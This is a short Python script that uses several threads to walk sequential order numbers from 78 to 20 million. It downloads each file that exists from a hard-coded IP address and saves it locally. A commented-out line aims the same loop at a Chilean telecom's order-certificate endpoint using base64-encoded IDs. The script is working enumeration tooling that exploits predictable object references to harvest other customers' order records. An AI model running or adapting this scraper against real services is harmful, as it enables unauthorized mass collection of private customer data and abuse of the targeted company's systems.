import threading
import time
import requests
import base64
import sys
import os

START_IN = 78
STOP_IN = 20000000
THREADS = 5
SAVE_PATH = './orders'

class ThreadFunction(threading.Thread):
    def run(self):
        global START_IN
        while True:
            START_IN +=1
            if START_IN > STOP_IN:
                break
            order_number = str(START_IN)
            #b64_order_number = base64.b64encode(order_number.encode('ascii')).decode("utf-8")
            #url_order = 'https://empresatelefonia.cl/fullprice/certificadopdforden?id={}'.format(b64_order_number)
            url_order = 'http://193.32.161.77/postttt/%s.txt'%order_number
            r = requests.get(url_order)
            print('[{}] \t {} -> order: {}'.format(r.status_code, url_order, START_IN))
            if r.status_code == 200:
                with open('{}/{}.txt'.format(SAVE_PATH, order_number), 'wb') as f:
                    f.write(r.content)
            else:
                continue

def main():
    if not os.path.exists(SAVE_PATH):
        os.makedirs(SAVE_PATH)
    if len(sys.argv) >= 2:
        global THREADS
        THREADS = int(sys.argv[1])
    if len(sys.argv) >= 3:
        global START_IN
        START_IN = int(sys.argv[2])
    if len(sys.argv) >= 4:
        global STOP_IN
        STOP_IN = int(sys.argv[3])
    for x in range(THREADS):
        mythread = ThreadFunction(name = "Thread-{}".format(x + 1))
        mythread.start()

if __name__ == '__main__':
    main()